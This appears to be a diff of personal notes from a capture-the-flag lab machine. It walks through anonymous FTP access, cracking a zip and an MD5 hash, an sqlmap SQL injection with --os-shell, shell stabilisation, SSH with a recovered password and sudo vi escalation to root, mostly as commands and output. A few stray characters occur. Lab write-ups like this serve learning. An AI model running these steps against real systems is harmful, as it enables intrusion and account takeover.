@@ -35,7 +35,8 @@ ________________________________________________________________________________
 |     PHPSESSID:
 |_      httponly flag not set
 ________________________________________________________________________________________________________________________
- \hl{File Transfer Protocol}
+#File Transfer Protocol
+
 └─$ ftp 10.129.95.174
 Connected to 10.129.95.174.
 220 (vsFTPd 3.0.3)
@@ -45,12 +46,13 @@ Password:
 230 Login successful.
 lRemote system type is UNIX.
 Using binary mode to transfer files.
-s
+
 ftp> ls
 229 Entering Extended Passive Mode (|||10291|)
 150 Here comes the directory listing.
 -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
 226 Directory send OK.
+
 ftp> get backup.zip
 local: backup.zip remote: backup.zip
 229 Entering Extended Passive Mode (|||10445|)
@@ -58,11 +60,13 @@ local: backup.zip remote: backup.zip
 100% |******************************************************************************************************************************************>
 226 Transfer complete.
 2533 bytes received in 00:00 (5.93 KiB/s)
+
 ftp> ls
 rm 229 Entering Extended Passive Mode (|||10971|)
 -150 Here comes the directory listing.
 -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
 226 Directory send OK.
+
 ftp> rm -rf backup.zip
 usage: rmdir directory-name
 ftp> ls
@@ -73,6 +77,7 @@ ftp> ls
 ftp> exit
 221 Goodbye.
 
+________________________________________________________________________________________________________________________
 
 #Password Cracking
 
@@ -85,6 +90,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 1g 0:00:00:00 DONE (2025-08-06 11:47) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..whitetiger
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
+________________________________________________________________________________________________________________________
 
 ─$ cat index.php
 <!DOCTYPE html>
@@ -99,6 +105,7 @@ session_start();
 ?>
 
 2cb42f8734ea607eefed3b70af13bbd3:qwerty789     #using this we can log into the webiste
+________________________________________________________________________________________________________________________
 
 #SQL- Map
 
@@ -118,6 +125,7 @@ session_start();
 [10:56:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
 GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
 sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+________________________________________________________________________________________________________________________
 
 #got a shell with this
 └─$ sqlmap -u 'http://ip.135/dashboard.php?search=Hello+baby/' --cookie='PHPSESSID=f3hj2svdd1i1rtvvrfdveluu3i' --os-shell
@@ -135,6 +143,7 @@ postgres@vaccine:/var/lib/postgresql/11/main$ whoami
 whoami
 postgres
 postgres@vaccine:/var/lib/postgresql/11/main$
+________________________________________________________________________________________________________________________
 
 # Inside your reverse shell:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -145,6 +154,7 @@ CTRL+Z
 # On your local terminal:
 stty raw -echo; fg
 # Then press: ENTER twice
+________________________________________________________________________________________________________________________
 
 #SSH
 NO LUCK AT STRATING BUT IN END GOT IT WITH CREDENTIALS
@@ -162,6 +172,7 @@ postgres@10.129.67.40's password: P@s5w0rd!
 Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
 
 postgres@vaccine:~$
+________________________________________________________________________________________________________________________
 
 #finally
 # this is used in the final enum part
@@ -170,12 +181,15 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 
 # whoami
 root
+
 # cd /root
 # ls
 pg_hba.conf  root.txt  snap
+
 # cd /bin/shell
 /bin/sh: 4: cd: can't cd to /bin/shell
 # bash
+
 root@vaccine:~# ls
 pg_hba.conf  root.txt  snap
 root@vaccine:~# cat root.txt
